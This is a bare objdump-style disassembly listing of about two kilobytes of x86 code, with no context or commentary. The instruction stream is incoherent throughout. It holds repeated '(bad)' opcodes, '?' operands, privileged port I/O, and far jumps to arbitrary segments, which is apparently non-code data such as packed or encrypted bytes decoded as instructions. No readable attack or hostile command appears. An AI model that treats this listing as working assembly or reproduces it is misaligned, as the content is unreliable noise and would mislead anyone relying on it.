  416f7b:	imul   esp,DWORD PTR [edi+0xf],0x21
  416f7f:	leave  
  416f80:	mov    bh,0x81
  416f82:	cmp    esp,DWORD PTR [edi]
  416f84:	push   ss
  416f85:	mov    al,ds:0x621cf879
  416f8a:	ror    dh,0x4f
  416f8d:	inc    ebp
  416f8e:	ja     0x416f50
  416f90:	sbb    BYTE PTR [esi+0x6e],ah
  416f93:	sahf   
  416f94:	loopne 0x417002
  416f96:	idiv   DWORD PTR [ecx+0x7ab074c4]
  416f9c:	out    0x17,al
  416f9e:	das    
  416f9f:	adc    al,0xab
  416fa1:	ror    BYTE PTR [bp+si-0x5527],cl
  416fa6:	push   cs
  416fa7:	gs (bad) 
  416fa9:	cmp    al,BYTE PTR [esi-0x5f]
  416fac:	pop    esi
  416fad:	retf   
  416fae:	das    
  416faf:	jb     0x41700e
  416fb1:	inc    eax
  416fb2:	adc    al,0xe4
  416fb4:	popa   
  416fb5:	mov    cl,0x84
  416fb7:	stos   DWORD PTR es:[edi],eax
  416fb8:	loop   0x416f56
  416fba:	jmp    0x9fbe:0xd05f886e
  416fc1:	mov    esi,0x7dc98505
  416fc6:	(bad)  
  416fc7:	imul   ebx,DWORD PTR ds:0xbef351c,0x42
  416fce:	fwait
  416fcf:	aaa    
  416fd0:	scas   eax,DWORD PTR es:[edi]
  416fd1:	jb     0x417045
  416fd3:	adc    al,0xc3
  416fd5:	dec    ecx
  416fd6:	hlt    
  416fd7:	cmp    al,0x1e
  416fd9:	dec    esp
  416fda:	pop    eax
  416fdb:	dec    ebx
  416fdc:	stos   DWORD PTR es:[edi],eax
  416fdd:	shl    DWORD PTR [esi+0x7f],1
  416fe0:	imul   ebp,DWORD PTR [ebp+0x29],0x7a05b726
  416fe7:	mov    ebp,DWORD PTR [ebx+0x16ea4ea4]
  416fed:	call   FWORD PTR [ecx]
  416fef:	mov    ss,WORD PTR [ecx]
  416ff1:	ret    0xae96
  416ff4:	jmp    0xc65d:0xd1a6a56e
  416ffb:	out    0x65,eax
  416ffd:	xchg   ebp,eax
  416ffe:	inc    ebp
  416fff:	mov    al,0x25
  417001:	mov    DWORD PTR [ecx-0x78],edi
  417004:	cld    
  417005:	adc    edi,DWORD PTR [eax+edi*4]
  417008:	dec    esp
  417009:	mov    ds:0xffc3dc94,al
  41700e:	dec    eax
  41700f:	jmp    0x1234:0x76dbb199
  417016:	sub    bl,0xa4
  417019:	and    al,0xa3
  41701c:	out    0x50,al
  41701e:	punpckldq mm5,DWORD PTR [ebx-0x36b86b4c]
  417025:	cli    
  417026:	dec    edx
  417027:	mov    edi,0x37d31608
  41702c:	int3   
  41702d:	xor    bl,BYTE PTR [ecx]
  41702f:	sbb    dl,ah
  417031:	lods   eax,DWORD PTR ds:[esi]
  417032:	mov    al,0xc3
  417034:	cmp    al,0x91
  417036:	mov    esp,0xefa554da
  41703b:	cmp    al,0xda
  41703d:	jl     0x41705c
  41703f:	(bad)  
  417040:	je     0x416fe3
  417042:	cld    
  417043:	push   edx
  417044:	stos   DWORD PTR es:[edi],eax
  417045:	int3   
  417046:	adc    ch,dh
  417048:	mov    dl,0x85
  41704a:	sub    al,0x37
  41704c:	sub    dh,BYTE PTR [ebp+0x2b]
  41704f:	sbb    dh,BYTE PTR [edx-0x29]
  417052:	xchg   BYTE PTR [ebp+0x6d],cl
  417055:	xor    ebp,DWORD PTR [ebx+ebp*4]
  417058:	push   eax
  417059:	mov    al,ds:0x8f45f10
  41705e:	mov    bh,0x9
  417060:	mov    al,dh
  417062:	ret    
  417063:	pop    ecx
  417064:	mov    edx,0xf69648e5
  417069:	dec    ebx
  41706a:	mov    esi,ebp
  41706c:	(bad)  
  41706d:	stc    
  41706e:	hlt    
  41706f:	add    eax,0x6efafa0
  417074:	aam    0x8f
  417076:	sub    ecx,ecx
  417078:	sti    
  417079:	pushf  
  41707a:	pop    esp
  41707b:	aas    
  41707c:	cmp    al,0x36
  41707e:	or     BYTE PTR [edx-0x71],dh
  417081:	aam    0x42
  417083:	sar    edx,cl
  417085:	retw   
  417087:	mov    ch,0xa3
  417089:	add    eax,DWORD PTR [esi-0x7b]
  41708c:	dec    ebp
  41708d:	sub    ecx,DWORD PTR [esi]
  41708f:	ins    BYTE PTR es:[edi],dx
  417090:	int3   
  417091:	pop    eax
  417092:	dec    esi
  417093:	cli    
  417094:	out    0x14,eax
  417096:	shr    DWORD PTR [edx-0x545acc2],1
  41709c:	stc    
  41709d:	add    BYTE PTR [eax+0x527e2bf7],cl
  4170a3:	leave  
  4170a4:	cmp    ecx,ecx
  4170a6:	retf   0xf9d0
  4170a9:	mov    ebx,0x6882599
  4170ae:	and    BYTE PTR [ebx+ebp*8],0xd4
  4170b2:	shl    BYTE PTR [eax-0x80],1
  4170b5:	push   edx
  4170b6:	and    cl,bl
  4170b8:	push   si
  4170ba:	stos   BYTE PTR es:[edi],al
  4170bb:	xchg   ecx,eax
  4170bc:	sbb    ecx,ebp
  4170be:	mov    WORD PTR [edx+0x58f709e3],es
  4170c4:	adc    eax,0x695200b4
  4170c9:	or     BYTE PTR [ebp+0x476d9a2d],ah
  4170cf:	mov    cl,0x86
  4170d1:	scas   al,BYTE PTR es:[edi]
  4170d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d4:	adc    al,0x90
  4170d6:	adc    al,0xc4
  4170d8:	and    al,0xa0
  4170da:	xor    esp,ecx
  4170dc:	out    dx,eax
  4170dd:	stc    
  4170de:	mov    esi,0x41260ebf
  4170e3:	or     ebp,DWORD PTR [eax-0x4]
  4170e6:	mov    ds:0xdaf7bf16,al
  4170eb:	enter  0xea04,0x2e
  4170ef:	iret   
  4170f0:	test   DWORD PTR [ecx-0x64],0xf210b228
  4170f7:	sub    al,0x7f
  4170f9:	neg    al
  4170fb:	(bad)  
  4170fd:	xchg   BYTE PTR [eax+0x3],dl
  417100:	lock das 
  417102:	jo     0x41711c
  417104:	dec    ebx
  417105:	repnz retf 0xbdc
  417109:	mov    edx,0x841b8a72
  41710e:	pusha  
  41710f:	xchg   ebp,eax
  417111:	ins    BYTE PTR es:[edi],dx
  417112:	pushf  
  417113:	jo     0x4170b7
  417115:	sub    al,0x18
  417117:	push   ebp
  417118:	in     al,dx
  417119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41711a:	clc    
  41711b:	pop    es
  41711c:	(bad)  
  41711d:	int    0x15
  41711f:	lds    ecx,FWORD PTR [edx-0x42]
  417122:	retf   0x6bea
  417125:	repz adc al,0xcd
  417128:	arpl   si,bx
  41712a:	es push ebp
  41712c:	out    dx,eax
  41712d:	ins    BYTE PTR es:[edi],dx
  41712e:	pop    esi
  41712f:	mov    edx,0x8656295d
  417134:	stos   BYTE PTR es:[edi],al
  417135:	inc    ebx
  417136:	cwde   
  417137:	aas    
  417138:	mov    ds:0x9d80bc15,eax
  41713d:	not    dl
  41713f:	push   ecx
  417140:	nop
  417141:	xor    bh,0x43
  417144:	cmpxchg DWORD PTR [edx+0x79],esi
  417148:	(bad)
  41714b:	(bad)  
  41714c:	mov    esi,0xf9339922
  417151:	sbb    eax,0x7fcd61e6
  417156:	or     BYTE PTR [ebx],dl
  417158:	mov    ebx,0x1e7d87af
  41715d:	mov    cl,0xfc
  41715f:	xor    bl,BYTE PTR [eax+0x4e8eff65]
  417165:	in     al,dx
  417166:	je     0x417182
  417168:	and    eax,0x25088764
  41716d:	scas   al,BYTE PTR es:[edi]
  41716e:	shr    DWORD PTR [eax+0x513b61fd],1
  417174:	jmp    0x48f5:0x375937b9
  41717b:	dec    edx
  41717c:	jne    0x417121
  41717e:	fsubr  QWORD PTR [edx-0x7b8d4a44]
  417184:	and    al,0x15
  417186:	xor    dl,BYTE PTR ds:0x47e8d511
  41718c:	jns    0x417178
  41718e:	cwde   
  41718f:	pop    ds
  417190:	or     eax,0x2a3ca53d
  417195:	fs push ecx
  417197:	jnp    0x417147
  417199:	repz jecxz 0x4171e1
  41719c:	cmp    DWORD PTR [edi-0x4c],0xa45e6de1
  4171a3:	(bad)  
  4171a4:	cli    
  4171a5:	daa    
  4171a6:	mov    DWORD PTR [eax+0x71d72016],eax
  4171ac:	or     DWORD PTR [eax-0xd2bfac0],ebp
  4171b2:	pop    edi
  4171b3:	xchg   ebx,eax
  4171b4:	dec    esi
  4171b5:	xor    BYTE PTR [ebp-0x7f3994e3],ah
  4171bb:	pop    ss
  4171bc:	dec    esi
  4171bd:	xor    bh,dl
  4171bf:	daa    
  4171c0:	dec    ebp
  4171c1:	sbb    ah,BYTE PTR [edi+0x12]
  4171c4:	cmp    bh,dl
  4171c6:	push   ebx
  4171c7:	loopne 0x4171e4
  4171c9:	pop    esp
  4171ca:	xchg   ecx,eax
  4171cb:	ret    0x25e5
  4171ce:	inc    ecx
  4171cf:	dec    esi
  4171d0:	stc    
  4171d1:	push   ecx
  4171d2:	dec    eax
  4171d3:	push   0x780a0bc9
  4171d8:	lds    esp,FWORD PTR [edi]
  4171da:	test   BYTE PTR ds:0x26a39137,al
  4171e0:	loopne 0x41723b
  4171e2:	daa    
  4171e3:	int    0x81
  4171e5:	ror    cl,cl
  4171e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e8:	loop   0x4171bc
  4171ea:	sahf   
  4171eb:	sbb    eax,0xf430aa17
  4171f0:	in     eax,dx
  4171f1:	loopne 0x417231
  4171f3:	mov    bh,0x46
  4171f5:	out    dx,eax
  4171f6:	mov    WORD PTR [ebp+0x67e6dc03],?
  4171fc:	jl     0x417229
  4171fe:	mov    ecx,0x71d9562d
  417203:	jmp    0x2d4eca86
  417208:	mov    ah,0xe5
  41720a:	aas    
  41720b:	enter  0x2d2b,0x4e
  41720f:	mov    ?,WORD PTR [ebx]
  417211:	loop   0x4171cb
  417213:	mov    ebx,0x8dbcae07
  417218:	sar    al,0xd9
  41721b:	cmp    esi,eax
  41721d:	aaa    
  41721e:	es push cs
  417220:	or     BYTE PTR [edx],ah
  417222:	retf   
  417223:	lds    edi,FWORD PTR [ebx]
  417225:	test   DWORD PTR [eax-0x58],esi
  417228:	cli    
  417229:	jmp    0x41722e
  41722b:	mov    al,0x7b
  41722d:	ficomp DWORD PTR [ecx-0x35]
  417230:	mov    eax,ds:0xe2a78a58
  417235:	aaa    
  417236:	pusha  
  417237:	jno    0x41726a
  417239:	iret   
  41723a:	jno    0x41725c
  41723c:	inc    edx
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	lods   al,BYTE PTR ds:[esi]
  417255:	dec    edx
  417256:	lock jmp 0x70c098cc
  41725c:	mov    ecx,0x8f70707e
  417261:	sar    DWORD PTR [esi],0x1a
  417264:	mov    eax,0xa451a85d
  417269:	dec    esi
  41726a:	or     DWORD PTR [edi-0x676bbac1],eax
  417270:	push   esp
  417271:	adc    ebx,DWORD PTR [eax-0x46296e8a]
  417277:	inc    ecx
  417278:	(bad)  
  417279:	cmp    eax,0x632fd450
  41727e:	mov    esp,0xf64154dc
  417283:	sti    
  417284:	(bad)  
  417287:	loope  0x4172b0
  417289:	out    0x85,eax
  41728b:	stos   DWORD PTR es:[edi],eax
  41728c:	fs jmp 0x3b5c680c
  417292:	das    
  417293:	sbb    eax,0x31909208
  417298:	rol    BYTE PTR [ebp+0x77],cl
  41729b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41729c:	sbb    eax,esp
  41729e:	arpl   WORD PTR [ebx],sp
  4172a0:	sbb    al,0xb1
  4172a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172a3:	xchg   DWORD PTR [edx-0x4],edi
  4172a6:	jns    0x4172fd
  4172a8:	stos   BYTE PTR es:[edi],al
  4172a9:	dec    esp
  4172aa:	lds    esp,FWORD PTR [eax+eiz*8]
  4172ad:	retf   
  4172ae:	aad    0x7f
  4172b0:	mov    eax,0x1baf7aef
  4172b5:	xchg   esp,eax
  4172b6:	and    BYTE PTR [edx+0x34c6f687],al
  4172bc:	jns    0x417331
  4172be:	mov    al,0x57
  4172c0:	in     eax,0xcf
  4172c2:	xchg   edx,eax
  4172c3:	sub    ebx,ebp
  4172c5:	in     eax,dx
  4172c6:	dec    esp
  4172c7:	jl     0x417255
  4172c9:	inc    esi
  4172ca:	or     edx,ecx
  4172cc:	jns    0x4172a9
  4172ce:	test   bl,ah
  4172d0:	cwde   
  4172d1:	mov    esi,0x5d5dbc19
  4172d6:	int    0x44
  4172d8:	pop    ss
  4172d9:	std    
  4172da:	push   esi
  4172db:	sub    al,0xff
  4172dd:	popa   
  4172de:	dec    ch
  4172e0:	test   eax,0xe292c22
  4172e5:	jbe    0x417354
  4172e7:	mov    edx,0xcecbe727
  4172ec:	jno    0x41735a
  4172ee:	adc    ch,BYTE PTR [ecx]
  4172f0:	xchg   ebp,eax
  4172f1:	stos   BYTE PTR es:[edi],al
  4172f2:	ret    0x8593
  4172f5:	test   esi,0xd3447ce1
  4172fb:	stos   DWORD PTR es:[edi],eax
  4172fc:	add    DWORD PTR [eax+esi*8],eax
  4172ff:	shr    DWORD PTR [edx+ecx*1],1
  417302:	enter  0x8ed1,0x3
  417306:	sub    esi,DWORD PTR [edx-0x39bb83bd]
  41730c:	bound  ebp,QWORD PTR [edx-0x1d]
  41730f:	fs inc ecx
  417311:	pop    ds
  417312:	call   0x30479c80
  417317:	jnp    0x417398
  417319:	fsub   QWORD PTR [eax-0x1ccb38c2]
  41731f:	mov    esp,DWORD PTR [eax+0x72901dbc]
  417325:	xchg   ecx,eax
  417326:	arpl   WORD PTR [edi+edx*8],cx
  417329:	jl     0x417387
  41732b:	xor    ecx,DWORD PTR [ecx]
  41732d:	adc    BYTE PTR [ecx],cl
  41732f:	pop    ds
  417330:	test   eax,0x985ca57c
  417335:	pop    edx
  417336:	jnp    0x417356
  417338:	aaa    
  417339:	adc    edi,DWORD PTR [ecx]
  41733b:	aam    0x2b
  41733d:	aad    0xdd
  41733f:	frstor [esi+0x3b]
  417342:	adc    ch,al
  417344:	fsubrp st(5),st
  417346:	iret   
  417347:	xor    eax,0x97ef0034
  41734c:	outs   dx,DWORD PTR ds:[esi]
  41734d:	xor    al,dh
  41734f:	cmp    DWORD PTR [edi+0x50],esp
  417352:	xor    dh,dl
  417354:	mov    ds:0xccd37bcf,eax
  417359:	sbb    bh,BYTE PTR [esi]
  41735b:	mov    cl,BYTE PTR [edi+0x419ddc72]
  417361:	or     eax,0xa342c7b1
  417366:	nop
  417367:	mov    bh,0x60
  417369:	in     eax,0x61
  41736b:	loopne 0x4173d1
  41736d:	fidivr DWORD PTR [edi-0x6]
  417370:	lds    esp,FWORD PTR [ebp-0xb]
  417373:	sbb    BYTE PTR [ecx+ecx*1+0x40eca05c],ah
  41737a:	inc    ecx
  41737b:	dec    ebp
  41737c:	pop    ss
  41737d:	pop    edi
  41737e:	lds    ecx,FWORD PTR [ebx-0x6cb3ad38]
  417384:	pop    ebx
  417385:	imul   eax,DWORD PTR [ecx+0x702afbf],0x5f
  41738c:	sti    
  41738d:	pop    eax
  41738e:	inc    ebx
  41738f:	mov    ecx,0xffb50d57
  417394:	inc    edx
  417395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417396:	arpl   WORD PTR [ecx+0x77a13fe7],bx
  41739c:	mov    al,0x95
  41739e:	ja     0x4173b4
  4173a0:	xor    edi,ecx
  4173a2:	ror    DWORD PTR [ecx],0x3c
  4173a5:	xchg   esp,eax
  4173a6:	adc    eax,eax
  4173a8:	nop
  4173a9:	fldl2t 
  4173ab:	std    
  4173ac:	mov    ah,0x57
  4173ae:	adc    BYTE PTR [edi],bh
  4173b0:	push   eax
  4173b1:	ja     0x417371
  4173b3:	ja     0x417344
  4173b5:	cmp    DWORD PTR [ebp-0x19],esp
  4173b8:	aas    
  4173b9:	mov    ds:0x4c51df78,al
  4173be:	fcomi  st,st(6)
  4173c0:	inc    ebx
  4173c1:	sbb    ecx,DWORD PTR [eax+eax*2]
  4173c4:	jle    0x417433
  4173c6:	call   0xa25f7acb
  4173cb:	push   esp
  4173cc:	pop    esp
  4173cd:	std    
  4173ce:	cli    
  4173cf:	retf   0xdcc0
  4173d2:	pop    es
  4173d3:	mov    DWORD PTR [ebx],esi
  4173d5:	push   ecx
  4173d6:	add    ebp,DWORD PTR [ecx+0x45]
  4173d9:	mov    edi,esi
  4173db:	data16 outs dx,BYTE PTR ds:[esi]
  4173dd:	pop    eax
  4173de:	into   
  4173df:	ins    BYTE PTR es:[edi],dx
  4173e0:	cdq    
  4173e1:	push   edx
  4173e2:	adc    esi,esp
  4173e4:	fisub  WORD PTR [ebx]
  4173e6:	push   cs
  4173e7:	gs leave 
  4173e9:	fstp   QWORD PTR [ecx+0x11f90e69]
  4173ef:	pop    ds
  4173f0:	outs   dx,DWORD PTR ds:[esi]
  4173f1:	push   ss
  4173f2:	mov    esp,0x98e2c0b0
  4173f7:	push   ecx
  4173f8:	jle    0x4173f0
  4173fa:	fs jo  0x417453
  4173fd:	ins    BYTE PTR es:[edi],dx
  4173fe:	jno    0x417429
  417400:	out    dx,eax
  417401:	adc    eax,0x183dce29
  417406:	jne    0x4173f6
  417408:	outs   dx,DWORD PTR ds:[esi]
  417409:	xchg   edi,eax
  41740a:	repz pop ds
  41740c:	dec    ecx
  41740d:	inc    ebx
  41740e:	rcl    dh,cl
  417410:	sbb    al,0x1
  417412:	retf   
  417413:	fs scas eax,DWORD PTR es:[edi]
  417415:	mov    cl,0x22
  417417:	sub    bh,BYTE PTR [eax]
  417419:	rol    BYTE PTR [ebx-0xd7fc948],cl
  41741f:	enter  0x7075,0x7a
  417423:	sub    cl,BYTE PTR ds:0x40f0fbb3
  417429:	lea    edi,[esi-0xc]
  41742c:	fisubr DWORD PTR [edi]
  41742e:	mov    ebp,0x200a2aa1
  417433:	xchg   DWORD PTR [ebp+0x64],eax
  417436:	test   al,0x3d
  417438:	fsubr  QWORD PTR [ebx]
  41743a:	sbb    edi,DWORD PTR [ecx]
  41743c:	pop    edi
  41743d:	push   ss
  41743e:	ss cs dec edi
  417441:	(bad)  
  417442:	adc    ebx,edi
  417444:	std    
  417445:	sbb    esp,ecx
  417447:	push   edi
  417448:	push   ss
  417449:	push   esp
  41744a:	(bad)  
  41744b:	mov    esi,0x1fc0b303
  417450:	or     edi,esi
  417452:	push   ebx
  417453:	sbb    DWORD PTR [edi+0x4c212598],ecx
  417459:	ror    DWORD PTR [ecx],1
  41745b:	sub    cl,bl
  41745d:	rol    BYTE PTR [edi+0x456da8f4],cl
  417463:	jns    0x4173f4
  417465:	adc    DWORD PTR [esi],edx
  417467:	push   esp
  417468:	inc    edx
  417469:	bound  esi,QWORD PTR [ebp+0x16a18d78]
  41746f:	loop   0x4174a0
  417471:	push   eax
  417472:	mov    ds:0x304324fa,al
  417477:	and    BYTE PTR [ebp+0x41],ch
  41747a:	adc    dl,BYTE PTR [eax+0x6cc630c6]
  417480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417481:	iret   
  417482:	mov    cl,0xca
  417484:	push   ebx
  417485:	jo     0x4174fa
  417487:	cmp    eax,0x49251fbc
  41748c:	pusha  
  41748d:	mov    ss,WORD PTR [ebx+0x4b]
  417490:	mov    BYTE PTR [ebp-0x5d],0xa8
  417494:	addr16 cmc 
  417496:	mov    ds:0x3e668972,al
  41749b:	inc    ebp
  41749c:	sbb    al,0x56
  41749e:	or     ch,ch
  4174a0:	sbb    bh,BYTE PTR [edx-0x5e8d69c3]
  4174a6:	and    eax,0x62ec76f
  4174ab:	das    
  4174ac:	mov    esp,0x1c84543b
  4174b1:	shl    BYTE PTR [ebp+0x27],1
  4174b4:	js     0x41745f
  4174b6:	leave  
  4174b7:	fs repnz ins BYTE PTR es:[edi],dx
  4174ba:	aas    
  4174bb:	sub    cl,BYTE PTR [esi+0x4de939a6]
  4174c1:	loop   0x4174a9
  4174c3:	out    0xe0,eax
  4174c5:	int    0xbd
  4174c7:	sbb    ah,BYTE PTR [ebx-0x64a2f804]
  4174cd:	pop    esi
  4174ce:	add    al,0x53
  4174d0:	clc    
  4174d1:	outs   dx,DWORD PTR ds:[esi]
  4174d2:	xchg   edx,eax
  4174d3:	in     eax,0x21
  4174d5:	popf   
  4174d6:	xchg   esp,eax
  4174d7:	stos   DWORD PTR es:[edi],eax
  4174d8:	into   
  4174d9:	in     al,dx
  4174da:	add    BYTE PTR [ebx-0x1a],al
  4174dd:	mov    bh,0x10
  4174df:	and    eax,0x9d135f2f
  4174e4:	outs   dx,DWORD PTR ds:[esi]
  4174e5:	aam    0xe4
  4174e7:	jb     0x41753b
  4174e9:	je     0x417566
  4174eb:	mov    esi,es
  4174ed:	leave  
  4174ee:	imul   ebx,ebp,0x5127e261
  4174f4:	push   ebx
  4174f5:	es mov bl,0x8f
  4174f8:	dec    ecx
  4174f9:	les    ebx,FWORD PTR [ebp+0x736d7729]
  4174ff:	or     al,0x56
  417501:	mov    ds:0x2f48f656,eax
  417506:	int    0x37
  417508:	hlt    
  417509:	iret   
  41750a:	or     BYTE PTR [ecx],bh
  41750c:	xor    al,0xd
  41750e:	lea    esp,[ebx+0x1be2807f]
  417514:	mov    bh,0x99
  417516:	xchg   edx,eax
  417517:	loopne 0x41752f
  417519:	das    
  41751a:	retf   
  41751b:	loope  0x41758a
  41751d:	fcmovu st,st(5)
  41751f:	add    al,0x37
  417521:	xor    BYTE PTR [eax+0x31],cl
  417524:	cwde   
  417525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417526:	rdpmc  
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR ds:0xb93c7393,esp
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x41753d
  41754f:	lods   eax,DWORD PTR ds:[esi]
  417550:	sahf   
  417551:	xor    esp,ecx
  417553:	mov    eax,0x95621ec7
  417558:	lahf   
  417559:	cmc    
  41755a:	int3   
  41755b:	mov    ch,0xa0
  41755d:	jae    0x417578
  41755f:	enter  0xe31,0xd1
  417563:	push   edi
  417564:	sub    eax,0x16338e16
  417569:	sub    bh,cl
  41756b:	fimul  DWORD PTR [esi+0x62]
  41756e:	jno    0x4175ac
  417570:	sub    DWORD PTR [eax-0x5a],eax
  417573:	xor    dh,BYTE PTR [edi]
  417575:	clc    
  417576:	adc    al,0x4b
  417578:	xchg   ebx,eax
  417579:	rcr    DWORD PTR [ecx+0x15],0xe5
  41757d:	mov    ebx,0x718c6da7
  417582:	enter  0x2c3,0xcc
  417586:	cld    
  417587:	mov    DWORD PTR ss:[eax],edi
  41758a:	and    BYTE PTR [eax-0x663c6f8b],bl
  417590:	pop    edi
  417591:	fadd   QWORD PTR [ebx]
  417593:	dec    eax
  417594:	mov    dh,0xc6
  417596:	ss cmp bl,0xf7
  41759a:	into   
  41759b:	iret   
  41759c:	add    al,0x95
  41759e:	mov    edx,DWORD PTR [edx+ebp*1+0x42]
  4175a2:	mov    DWORD PTR [eax],esp
  4175a4:	xor    bh,0x6a
  4175a7:	adc    BYTE PTR [esi-0x66],al
  4175aa:	ja     0x4175ab
  4175ac:	enter  0x8312,0xe0
  4175b0:	rol    BYTE PTR [edx],1
  4175b2:	or     eax,0xd025e405
  4175b7:	stos   DWORD PTR es:[edi],eax
  4175b8:	inc    esi
  4175b9:	mov    esi,0xdf866818
  4175be:	push   esp
  4175bf:	mov    eax,0x9f21bf3
  4175c4:	cmp    eax,0x269c3d51
  4175c9:	jle    0x41756c
  4175cb:	and    ebx,DWORD PTR [ebp*4-0x1f55ff9f]
  4175d2:	add    edi,DWORD PTR [esi-0x22242311]
  4175d8:	cmp    ecx,ebp
  4175da:	mov    edi,0xdf5195e2
  4175df:	lods   al,BYTE PTR ds:[esi]
  4175e0:	mov    ecx,0xd9249476
  4175e5:	xchg   edi,eax
  4175e6:	and    eax,0xac76b9dd
  4175eb:	in     al,dx
  4175ec:	jnp    0x417580
  4175ee:	jo     0x417625
  4175f0:	cmp    WORD PTR [edx],cx
  4175f3:	cmp    BYTE PTR [eax],dh
  4175f5:	aam    0x12
  4175f7:	out    dx,al
  4175f8:	scas   eax,DWORD PTR es:[edi]
  4175f9:	dec    eax
  4175fa:	sbb    BYTE PTR [esi+0x3a41e9cc],cl
  417600:	sub    BYTE PTR ds:0x8ad4033d,ch
  417606:	mov    ds:0x28d71c5d,al
  41760b:	push   ecx
  41760c:	imul   ecx,DWORD PTR [edi-0x71],0x49
  417610:	addr16 out 0x6b,eax
  417613:	push   es
  417614:	pop    edi
  417615:	xor    bl,dl
  417617:	sahf   
  417618:	xlat   BYTE PTR ds:[ebx]
  417619:	xor    ebp,eax
  41761b:	jp     0x4175d8
  41761d:	cmp    al,0x53
  41761f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417620:	and    BYTE PTR ds:0xbd55f11f,dh
  417626:	jle    0x417683
  417628:	aaa    
  417629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41762a:	pop    esp
  41762b:	in     al,0x78
  41762d:	dec    eax
  41762e:	pop    ss
  41762f:	push   0xbca33483
  417634:	fisub  DWORD PTR ds:0xa6d9a87f
  41763a:	cmp    eax,0xede066ce
  41763f:	arpl   ax,dx
  417641:	retf   0x9037
  417644:	mov    ch,0xf4
  417646:	mov    ecx,0x43ab2f32
  41764b:	mov    bl,BYTE PTR ds:0xde5132
  417651:	stc    
  417652:	shl    DWORD PTR [ecx-0x704f02fb],cl
  417658:	lea    eax,[esi-0x23472758]
  41765e:	ror    BYTE PTR [esi+0x58],0x86
  417662:	mov    es,WORD PTR [ebp+0x4304fd6e]
  417668:	mov    bl,0xe6
  41766a:	inc    edx
  41766b:	and    BYTE PTR [ebp+edx*8-0x4b],bl
  41766f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417670:	add    ah,BYTE PTR [edi]
  417672:	in     al,0xd7
  417674:	ror    BYTE PTR [edi],0xed
  417677:	xor    ebx,esi
  417679:	inc    ebx
  41767a:	mov    cl,0x1
  41767c:	ja     0x4176d3
  41767e:	inc    esp
  41767f:	push   ds
  417680:	cli    
  417681:	ja     0x41761c
  417683:	or     cl,dh
  417685:	repnz add eax,0x82057292
  41768b:	mov    esp,0x98b3f2bb
  417690:	sbb    BYTE PTR [edx-0x18],0x72
  417694:	int    0xf8
  417696:	or     BYTE PTR [eax+0x3c],ah
  417699:	ret    
  41769a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41769b:	pop    ss
  41769c:	shl    BYTE PTR [ebx+0x6c600f7a],cl
  4176a2:	ror    DWORD PTR [esi+ecx*1-0x6a4bfe6a],0x9
  4176aa:	dec    ebp
  4176ab:	aas    
  4176ac:	aas    
  4176ad:	mov    bh,0x80
  4176af:	rcr    BYTE PTR [eax],0xf2
  4176b2:	shr    DWORD PTR [esi],0x60
  4176b5:	in     eax,0xc6
  4176b7:	add    ah,BYTE PTR [eax+0x1f04480c]
  4176bd:	cwde   
  4176be:	xor    eax,0xaad2e74e
  4176c3:	dec    edx
  4176c4:	add    DWORD PTR [edx],edi
  4176c6:	dec    edi
  4176c7:	lods   eax,DWORD PTR ds:[esi]
  4176c8:	jo     0x4176bb
  4176ca:	mov    dl,0x69
  4176cc:	pop    esp
  4176cd:	clc    
  4176ce:	icebp  
  4176cf:	sub    cl,dh
  4176d1:	mov    esi,0x82505e8a
  4176d6:	sub    ah,dl
  4176d8:	cs test bl,ah
  4176db:	daa    
  4176dc:	xchg   esp,eax
  4176dd:	inc    ecx
  4176de:	es xchg edx,eax
  4176e0:	in     eax,dx
  4176e1:	jns    0x4176aa
  4176e3:	xor    cl,0xbe
  4176e6:	push   0xfc0e1334
  4176eb:	lods   al,BYTE PTR ds:[esi]
  4176ec:	push   eax
  4176ed:	jp     0x417722
  4176ef:	push   esp
  4176f0:	dec    esp
  4176f1:	jo     0x417765
  4176f3:	or     ebx,ebp
  4176f5:	hlt    
  4176f6:	sbb    edx,edi
  4176f8:	ins    BYTE PTR es:[edi],dx
  4176f9:	sti    
  4176fa:	pop    edx
  4176fb:	shl    DWORD PTR [edi+edi*1],cl
  4176fe:	sar    DWORD PTR ds:0x528af811,cl
  417704:	push   ebx
  417705:	mov    bl,0xd0
  417707:	push   cs
  417708:	pop    ss
  417709:	or     edi,DWORD PTR [ebp+0x1f5f0f89]
  41770f:	mov    dh,0xbf
  417711:	int    0x78
  417713:	sbb    DWORD PTR [ecx-0x3a968153],esi
  417719:	call   0xbb49:0x85d58c9b
  417720:	push   ebp
  417721:	xchg   ebp,eax
  417722:	push   ss
  417723:	dec    ecx
  417724:	xchg   ebx,eax
  417725:	stc    
  417726:	xor    BYTE PTR [edi+edi*2+0x38],ah
  41772a:	add    dh,BYTE PTR [esi+0x50919778]
  417730:	jae    0x4176c7
  417732:	and    DWORD PTR [edx+0x2910dca0],0x3ef0be4b
  41773c:	dec    ebp
  41773d:	xchg   ebx,eax
